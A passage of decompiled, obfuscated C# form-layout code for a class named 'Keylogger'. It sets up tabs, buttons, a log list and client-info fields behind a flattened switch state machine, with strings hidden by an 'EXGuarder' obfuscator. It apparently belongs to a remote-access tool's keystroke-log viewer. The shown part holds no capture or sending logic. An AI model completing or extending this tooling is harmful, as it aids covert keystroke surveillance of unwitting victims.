            ((Keylogger) this).TabPage3.Name = EXGuarder.\u0031A053555;
            num1 = (int) num2 * -522242569 ^ -958784849;
            continue;
          case 260:
            this.ResumeLayout(false);
            num1 = (int) num2 * 1814899824 ^ 510394487;
            continue;
          case 261:
            this.ShowIcon = false;
            this.Text = EXGuarder.\u0031E77480B;
            ((ISupportInitialize) ((Keylogger) this).DGV0).EndInit();
            num1 = (int) num2 * 1425667644 ^ 834616942;
            continue;
          case 262:
            ((Keylogger) this).offlinetext.Text = EXGuarder.\u0035A6C3720;
            num1 = (int) num2 * 604018882 ^ 1338224050;
            continue;
          case 263:
            ((Keylogger) this).TabPage4.TabIndex = 1;
            num1 = (int) num2 * 2136851859 ^ 794309935;
            continue;
          case 264:
            ((Keylogger) this).TabPage3.SuspendLayout();
            num1 = (int) num2 * -440047473 ^ -1709454398;
            continue;
          case 265:
            ((Keylogger) this).combologs.TabIndex = 2;
            ((Keylogger) this).combologs.TextAlignment = ContentAlignment.MiddleLeft;
            ((Keylogger) this).delbtn.Dock = DockStyle.Left;
            num1 = (int) num2 * 1631085971 ^ -25507127;
            continue;
          case 266:
            ((Keylogger) this).keytabs.ResumeLayout(false);
            ((Keylogger) this).TabPage3.ResumeLayout(false);
            num1 = (int) num2 * 231682149 ^ 675354771;
            continue;
          case 267:
            ((Keylogger) this).clinameinfo.Dock = DockStyle.Fill;
            ((Keylogger) this).clinameinfo.Font = new Font(EXGuarder.\u003250A4D25, 9f);
            num1 = (int) num2 * 2043978812 ^ 1266904635;
            continue;
          case 268:
            ((Keylogger) this).savedbtn = new Button();
            num1 = (int) num2 * 1459434316 ^ -370251160;
            continue;
          default:
            goto label_271;
        }
      }
label_3:
      return;
label_271:;
    }
  }
}
